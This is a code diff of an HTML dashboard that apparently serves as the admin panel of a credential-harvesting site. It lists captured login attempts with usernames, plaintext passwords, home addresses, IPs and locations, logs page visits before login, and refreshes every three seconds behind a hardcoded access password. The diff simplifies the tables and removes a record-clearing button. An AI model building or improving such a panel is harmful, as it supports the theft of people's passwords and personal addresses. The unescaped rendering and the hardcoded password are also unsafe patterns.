@@ -10,11 +10,10 @@
         .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         .header { background: #1e40af; color: white; padding: 25px; text-align: center; }
         .section { margin: 25px 0; }
-        h2 { color: #1e40af; margin-bottom: 10px; }
+        h2 { color: #1e40af; }
         table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
         th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
         th { background: #e2e8f0; }
-        .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -24,41 +23,21 @@
             <p>Password: tunde6035</p>
         </div>
 
-        <!-- Section 1: Login Records -->
         <div class="section">
-            <h2>1. Login Records (Username, Password & Address)</h2>
+            <h2>1. Login Records</h2>
             <table id="loginTable">
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Username</th>
-                        <th>Password</th>
-                        <th>Home Address</th>
-                        <th>IP</th>
-                        <th>Location</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Time</th><th>Username</th><th>Password</th><th>Address</th><th>IP</th></tr></thead>
                 <tbody></tbody>
             </table>
         </div>
 
-        <!-- Section 2: Page Visits -->
         <div class="section">
-            <h2>2. Page Visits (Before Login)</h2>
+            <h2>2. Page Visits (Immediate)</h2>
             <table id="visitTable">
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Type</th>
-                        <th>IP</th>
-                        <th>Location</th>
-                    </tr>
-                </thead>
+                <thead><tr><th>Time</th><th>Type</th><th>IP</th><th>Location</th></tr></thead>
                 <tbody></tbody>
             </table>
         </div>
-
-        <button class="clear-btn" onclick="clearRecords()">Clear All Records</button>
     </div>
 
     <script>
@@ -75,23 +54,9 @@
 
             records.forEach(r => {
                 if (r.type === "Login Attempt") {
-                    loginBody.innerHTML += `
-                        <tr>
-                            <td>${r.timestamp}</td>
-                            <td><strong>${r.username || '-'}</strong></td>
-                            <td><code>${r.password}</code></td>
-                            <td>${r.address || '-'}</td>
-                            <td>${r.ip || '-'}</td>
-                            <td>${r.location || 'Unknown'}</td>
-                        </tr>`;
+                    loginBody.innerHTML += `<tr><td>${r.timestamp}</td><td><strong>${r.username}</strong></td><td><code>${r.password}</code></td><td>${r.address || '-'}</td><td>${r.ip}</td></tr>`;
                 } else {
-                    visitBody.innerHTML += `
-                        <tr>
-                            <td>${r.timestamp}</td>
-                            <td>${r.type}</td>
-                            <td>${r.ip || '-'}</td>
-                            <td>${r.location || 'Unknown'}</td>
-                        </tr>`;
+                    visitBody.innerHTML += `<tr><td>${r.timestamp}</td><td>${r.type}</td><td>${r.ip}</td><td>${r.location || 'Unknown'}</td></tr>`;
                 }
             });
         }
@@ -102,17 +67,10 @@
                 loadRecords();
                 setInterval(loadRecords, 3000);
             } else {
-                alert("❌ Wrong Password");
+                alert("Wrong Password");
                 window.location.href = "/";
             }
         };
-
-        async function clearRecords() {
-            if (confirm("Clear all records?")) {
-                await fetch('/api/clear', { method: 'POST' });
-                loadRecords();
-            }
-        }
     </script>
 </body>
 </html>
